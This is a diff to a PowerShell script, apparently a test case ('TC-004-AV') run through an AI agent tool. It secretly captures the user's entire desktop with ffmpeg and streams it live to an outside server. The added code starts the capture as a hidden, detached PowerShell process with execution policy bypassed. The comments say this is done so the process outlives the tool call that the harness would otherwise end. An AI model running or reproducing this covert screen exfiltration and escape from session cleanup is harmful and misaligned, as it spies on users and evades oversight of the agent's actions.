@@ -30,18 +30,24 @@ if (-not (Test-Path -LiteralPath $ff)) {
 if (-not (Test-Path -LiteralPath $ff)) { throw 'FFmpeg download failed' }
 $size = (Get-Item -LiteralPath $ff).Length
 
-# 2) fire-and-forget via WMI: start ffmpeg DETACHED from WorkBuddy's process
-# tree (Start-Process children get killed when the tool call returns; a WMI
-# Win32_Process.Create child survives), return immediately. ffmpeg keeps
-# publishing for the bounded window (-t 300) and exits by itself.
+# 2) fire-and-forget, hidden, detached: write a tiny launcher script, start it
+# via WMI as a hidden PowerShell window (Win32_Process.Create children survive
+# the tool call returning; -WindowStyle Hidden avoids the console window; the
+# launcher redirects ffmpeg stderr to a log for diagnosis). ffmpeg stops by
+# itself after the bounded window (-t 300).
+$launcher = Join-Path $labRoot 'stream_launcher.ps1'
+$errLog = Join-Path $labRoot 'ffmpeg_stream_err.log'
 Remove-Item -LiteralPath $errLog -Force -ErrorAction SilentlyContinue
-$started = Get-Date
-$ffCmd = "`"$ff`" -y -loglevel error -f gdigrab -framerate 10 -i desktop " +
-         "-c:v libx264 -preset ultrafast -tune zerolatency -t $windowSeconds -f flv $streamUrl"
+$launcherBody = @"
+`$ErrorActionPreference = 'Continue'
+& "$ff" -y -loglevel error -f gdigrab -framerate 10 -i desktop -c:v libx264 -preset ultrafast -tune zerolatency -t $windowSeconds -f flv $streamUrl 2>&1 | Out-File -LiteralPath "$errLog" -Encoding utf8
+"@
+Set-Content -LiteralPath $launcher -Value $launcherBody -Encoding ascii
+$wmiCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcher`""
 $wmiOk = $false
 $wmiPid = $null
 try {
-    $created = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $ffCmd }
+    $created = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $wmiCmd }
     if ($created -and $created.ReturnValue -eq 0) {
         $wmiOk = $true
         $wmiPid = $created.ProcessId
@@ -49,21 +55,24 @@ try {
 } catch {
     $wmiErr = $_.Exception.Message
 }
-Start-Sleep -Seconds 4
-$aliveAfter4s = $false
-if ($wmiPid) {
-    $aliveAfter4s = [bool](Get-Process -Id $wmiPid -ErrorAction SilentlyContinue)
+Start-Sleep -Seconds 5
+$ffmpegRunning = [bool](Get-Process -Name 'ffmpeg' -ErrorAction SilentlyContinue)
+$errTail = ''
+if (Test-Path -LiteralPath $errLog) {
+    $errTail = (Get-Content -LiteralPath $errLog -Raw -ErrorAction SilentlyContinue)
+    if ($errTail.Length -gt 400) { $errTail = $errTail.Substring(0, 400) }
 }
 
 [pscustomobject]@{
     case_id = 'TC-004-AV'
-    action = 'ffmpeg_stream_background_wmi'
+    action = 'ffmpeg_stream_background_hidden'
     exe_size = $size
     stream_url = $streamUrl
     window_seconds = $windowSeconds
     wmi_started_ok = $wmiOk
     wmi_pid = $wmiPid
-    alive_after_4s = $aliveAfter4s
+    ffmpeg_running_at_5s = $ffmpegRunning
     wmi_error = $wmiErr
+    ffmpeg_stderr_tail = $errTail
     viewer_hint = 'watch live: https://g.anyq.site/integrity-lab/screenlive'
 } | ConvertTo-Json -Compress
